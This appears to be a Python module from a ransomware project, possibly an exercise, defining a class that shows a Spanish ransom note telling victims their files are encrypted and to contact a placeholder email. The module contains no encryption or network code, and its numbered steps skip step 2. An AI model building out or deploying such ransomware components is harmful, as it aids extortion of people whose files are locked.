# views/ransom_note.py
import tkinter as tk

class RansomNote:
    def __init__(self, key, destination, user_interface):
        self.key = key
        self.destination = destination
        self.user_interface = user_interface
        self.note_content=""

    def create_note(self):
        note_content = (
            "¡Tus archivos han sido cifrados!\n"
            "Para recuperarlos, sigue estos pasos:\n"
            "1. Contacta: fakeemail@correo.com\n"
            "3. Espera instrucciones adicionales."
        )
        self.user_interface.show_ransom_message(note_content)